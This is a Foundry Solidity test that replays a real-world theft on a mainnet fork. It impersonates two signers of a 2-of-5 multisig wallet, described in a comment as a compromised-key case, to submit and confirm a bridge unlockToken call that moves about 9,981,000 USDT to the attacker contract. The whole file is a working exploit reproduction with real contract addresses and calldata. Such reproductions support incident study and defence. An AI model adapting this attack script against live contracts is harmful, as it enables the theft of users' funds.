// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    MultiSig MultiSigWallet = MultiSig(payable(0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6));

    address[] public owner;

    function setUp() public {
        cheat.createSelectFork("mainnet", 15_012_645); //fork mainnet at block 15012645
    }

    function testExploit() public {
        emit log_named_uint("USDT balance of attacker before Exploit", usdt.balanceOf(address(this)));
        // Mulsig Case of compromised private key.
        emit log_named_uint("How many approval required:", MultiSigWallet.required());
        cheat.prank(0xf845A7ee8477AD1FB4446651E548901a2635A915);
        // TxHash: https://etherscan.io/tx/0x27981c7289c372e601c9475e5b5466310be18ed10b59d1ac840145f6e7804c97
        bytes memory msgP1 =
            hex"fe7f61ea000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000913e1f5a200000000000000000000000000";
        bytes memory recipient = abi.encodePacked(address(this));
        bytes memory receiptId = hex"d48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99ef5479b6";
        bytes memory _message = bytes.concat(msgP1, recipient, receiptId);
        uint256 txId = MultiSigWallet.submitTransaction(
            0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857, // destination
            0, // value
            _message
        );
        // unlockToken(address,uint256,address,bytes32)
        // ethToken: dac17f958d2ee523a2206206994597c13d831ec7
        // amount: 9981000000000
        // recipient: b4c79dab8f259c7aee6e5b2aa729821864227e84
        // receiptId: d48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99ef5479b6

        emit log_named_address(
            "2 of 5 multisig wallet, transaction first signed by:", MultiSigWallet.getConfirmations(txId)[0]
        );
        cheat.prank(0x812d8622C6F3c45959439e7ede3C580dA06f8f25);
        MultiSigWallet.confirmTransaction(txId); // Transfer 9,981,000 USDT to address(this)
        emit log_named_address(
            "2 of 5 multisig wallet, transaction second signed by:", MultiSigWallet.getConfirmations(txId)[1]
        );
        emit log_named_uint("USDT balance of attacker after Exploit", usdt.balanceOf(address(this)));
    }

    receive() external payable {}
}
